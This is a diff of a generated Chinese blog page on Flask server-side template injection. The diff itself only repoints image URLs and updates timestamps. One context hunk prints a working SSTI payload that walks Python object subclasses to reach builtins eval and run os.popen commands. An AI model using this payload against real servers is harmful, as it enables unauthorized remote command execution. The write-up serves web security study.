@@ -25,16 +25,16 @@
 <meta property="og:site_name" content="Sl0th&#39;s Blog">
 <meta property="og:description" content="SSTI原理学习Flask框架12345678910111213141516171819from flask import requestfrom flask import Flaskfrom flask import render_template_stringapp &#x3D; Flask(__name__)  # app是Flask的实例，它接收包或者模块的名字作为参数，但一般都是传递__name_">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032356329.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032356913.jpg">
+<meta property="og:image" content="http://sloth31.github.io/images/202407032356329.png">
+<meta property="og:image" content="http://sloth31.github.io/images/202407032356913.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/e6c9d24ely1h5942j1v17j20zq0kc0ut.jpg">
 <meta property="og:image" content="https://tva1.sinaimg.cn/large/e6c9d24ely1h5960ldw74j211809k40e.jpg">
 <meta property="article:published_time" content="2022-04-03T15:54:47.000Z">
-<meta property="article:modified_time" content="2024-07-03T15:58:34.570Z">
+<meta property="article:modified_time" content="2024-11-11T10:23:06.324Z">
 <meta property="article:author" content="Sl0th">
 <meta property="article:tag" content="web.ssti">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032356329.png">
+<meta name="twitter:image" content="http://sloth31.github.io/images/202407032356329.png">
     
     
     <!--- Icon Part-->
@@ -467,8 +467,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-07-03 23:58:34</span>
-            <span class="mobile">2024-07-03 23:58:34</span>
+            <span class="desktop">2024-11-11 18:23:06</span>
+            <span class="mobile">2024-11-11 18:23:06</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -525,7 +525,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032356329.png"
+                     data-src="/../images/202407032356329.png"
                      
                 ></p>
 <h2 id="利用eval内建函数执行命令–payload理解"><a href="#利用eval内建函数执行命令–payload理解" class="headerlink" title="利用eval内建函数执行命令–payload理解"></a>利用eval内建函数执行命令–payload理解</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__ <span class="comment"># 获取到object</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">99</span>] <span class="comment"># 利用脚本的找到_frozen_importlib_external.FileLoader类，下标每一次都不一定一样</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">99</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls +/&#x27;).read()&quot;</span>) <span class="comment"># 利用该类含有builtins类中的内建eval执行命令，os模块中的popen函数与system函数都能用于执行系统命令，但是system函数不会返回命令执行结果</span></span><br></pre></td></tr></table></figure></div>
@@ -590,7 +590,7 @@
 <p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032356913.jpg"
+                     data-src="/../images/202407032356913.jpg"
                       alt="image-20220816200203853"
                 ><figcaption>image-20220816200203853</figcaption></figure></p>
 <p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
@@ -799,7 +799,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-07-03 23:58:34
+                    :</strong> 2024-11-11 18:23:06
             </li>
         
         <li>
